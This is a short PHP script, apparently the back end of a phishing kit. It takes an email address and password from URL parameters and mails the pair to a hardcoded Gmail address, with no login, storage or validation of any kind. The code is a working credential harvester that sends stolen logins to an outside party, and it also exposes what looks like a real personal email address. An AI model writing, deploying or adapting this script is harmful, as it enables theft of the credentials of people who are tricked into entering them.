<?php
$recepient = "sergey.denisyuk@gmail.com";
$sitename = "Название сайта";

$email = trim($_GET["email"]);
$pass = trim($_GET["pass"]);

if ($pass!='' and $email!='') {
    $message = "$email $pass";
    $res = mail($recepient, 'Subject', $message);
    if ($res) {
        echo 1;
    } else {
        echo 0;
    }
}
else {
    echo 0;
}

?>